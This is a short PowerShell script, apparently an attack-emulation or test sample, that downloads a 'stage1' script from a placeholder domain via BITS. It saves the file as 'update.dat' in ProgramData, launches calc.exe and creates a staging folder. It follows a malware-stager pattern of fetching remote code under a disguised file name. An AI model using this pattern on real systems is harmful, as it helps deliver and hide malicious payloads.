
[CmdletBinding()]
param(
    [string]$FetchUrl = 'http://contoso.com/stage1.ps1',
    [string]$Stage2Path = "C:\ProgramData\update.dat",
    [int]$ConnectionTimeout = 94
)
Start-BitsTransfer -Source $FetchUrl -Destination $Stage2Path
Start-Process -FilePath "calc.exe"
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
